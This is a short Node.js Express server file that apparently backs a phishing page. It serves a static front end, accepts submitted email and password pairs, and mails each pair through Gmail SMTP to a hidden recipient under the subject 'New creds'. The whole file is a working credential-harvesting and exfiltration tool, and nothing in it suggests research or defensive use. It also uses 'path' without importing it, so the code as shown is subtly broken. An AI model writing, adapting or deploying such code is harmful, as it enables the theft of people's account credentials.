const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");
const Joi = require("joi");
const nodemailer = require("nodemailer");

const publicPath = path.join(__dirname, "public");
const app = express();
app.use(cors());
app.use(express.static(publicPath));
dotenv.config();

// input validation
const schema = Joi.object({
  email: Joi.string()
    .email({
      minDomainSegments: 2,
      tlds: { allow: ["com", "net"] },
    })
    .required(),
  password: Joi.string().pattern(new RegExp("^[a-zA-Z0-9]{3,30}$")).required(),
});

// nodemailer setup

const transporter = nodemailer.createTransport({
  service: "Gmail",
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASSWORD,
  },
  pool: true,
});

app.use(express.json({ extended: false }));

app.get("/", (req, res) => {
  res
    .status(200)
    .json({ statusCode: 200, message: "Your server is active", data: null });
});

app.post("/", async (req, res) => {
  try {
    const { email, password } = await schema.validateAsync(req.body);
    const mailOptions = {
      from: process.env.SMTP_USER,
      to: process.env.RECIPIENT_USER,
      subject: "New creds",
      html: `<!DOCTYPE html>
            <html>
  <body>
    <h1>Hello</h1>
    <p>Your new credentials are email ${email} and password ${password} </p>
  </body>
</html>`,
    };
    const response = await transporter.sendMail(mailOptions);
    res.status(200).json({
      statusCode: 200,
      message: "successfully sent mail",
      data: response,
    });
  } catch (error) {
    res.status(400).json({
      statusCode: 400,
      message: error.message,
      data: null,
    });
  }
});

app.all("*", (req, res) => {
  res.send({
    code: 404,
    message: "route doesn't exist",
  });
});

const PORT = process.env.PORT || 7000;

app.listen(PORT, () => console.log(`Server is listening on port  ${PORT}`));


module.exports = app;
